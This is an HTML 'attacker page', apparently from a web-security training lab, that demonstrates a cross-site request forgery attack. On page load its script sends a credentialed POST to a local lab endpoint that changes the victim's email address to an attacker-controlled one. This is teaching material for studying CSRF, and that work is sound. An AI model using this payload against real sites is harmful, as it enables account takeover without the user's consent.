<html>
<head>
	<title>Attacker Page</title>
	<script>
		     var xmlhttp = new XMLHttpRequest();
		     xmlhttp.open("POST","http://localhost:8080/lab/result/CSRF.jsp");
		     var data="input=attacker@attacker.com&vulnerable=true";
		     
		     xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		     xmlhttp.withCredentials = true;
		     xmlhttp.send(data);
	</script>
</head>

<body>
	<h4>This is attacker page to test CSRF (POST). Open Dev Tool to see the AJAX request to update email address.</h4>
</body>
</html>
